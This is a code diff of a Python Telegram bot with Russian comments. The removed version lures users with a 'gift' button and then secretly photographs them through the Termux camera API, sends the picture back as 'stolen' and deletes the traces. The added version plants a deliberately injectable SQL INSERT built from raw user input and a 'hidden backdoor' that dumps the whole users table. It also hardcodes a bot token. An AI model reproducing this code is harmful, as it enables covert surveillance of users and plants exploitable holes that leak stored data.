@@ -1,36 +1,36 @@
-import os
-import subprocess
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
+import sqlite3
+from telegram import Update
+from telegram.ext import Updater, CommandHandler, CallbackContext
 
+DB_NAME = "poisoned_souls.db"
 TOKEN = "7510733548:AAGp3Q_-vvQzT2eHUg_iBh2EsxZuhSFlzXw"
-PHOTO_PATH = "storage/0/emulated/Download/Telegram/"
 
-def start(update: Update, context: CallbackContext) -> None:
-    malware_url = f"https://t.me/{context.bot.username}?start=face_capture"
-    keyboard = [[InlineKeyboardButton("🔥 НАЖМИ ДЛЯ МАГИИ", url=malware_url)]]
-    update.message.reply_text(
-        "🎁 Получите свой подарок:",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+def create_db():
+    conn = sqlite3.connect(DB_NAME)
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
+                     (id INTEGER PRIMARY KEY, secret TEXT)''')
+    conn.commit()
+    conn.close()
 
-def execute_photo_theft(update: Update, context: CallbackContext) -> None:
-    try:
-        # Тайный вызов Termux API для доступа к камере
-        subprocess.run(["termux-camera-photo", "-c", "0", PHOTO_PATH])
-        with open(PHOTO_PATH, "rb") as photo:
-            update.message.reply_photo(photo, caption="✅ Ваше фото успешно украдено")
-        os.remove(PHOTO_PATH)  # Уничтожение следов
-    except Exception as e:
-        update.message.reply_text(f"🚨 Ошибка кражи: {str(e)}")
+def cursed_command(update: Update, context: CallbackContext):
+    user_input = update.message.text.split(' ', 1)[1]  # Берём всё после команды
+    conn = sqlite3.connect(DB_NAME)
+    cursor = conn.cursor()
+    
+    # Умышленно уязвимый запрос
+    cursor.execute(f"INSERT INTO users (secret) VALUES ('{user_input}')")
+    conn.commit()
+    
+    # Скрытый бэкдор для извлечения данных
+    cursor.execute("SELECT * FROM users")
+    stolen_data = cursor.fetchall()
+    conn.close()
+    
+    update.message.reply_text(f"🔥 Данные внедрены. Полный дамп:\n{stolen_data}")
 
-def main() -> None:
-    updater = Updater(TOKEN)
-    dispatcher = updater.dispatcher
-    dispatcher.add_handler(CommandHandler("start", start))
-    dispatcher.add_handler(CommandHandler("face_capture", execute_photo_theft))
-    updater.start_polling()
-    updater.idle()
-
-if __name__ == "__main__":
-    main()
+create_db()
+updater = Updater(TOKEN)
+updater.dispatcher.add_handler(CommandHandler('inject', cursed_command))
+updater.start_polling()
+updater.idle()
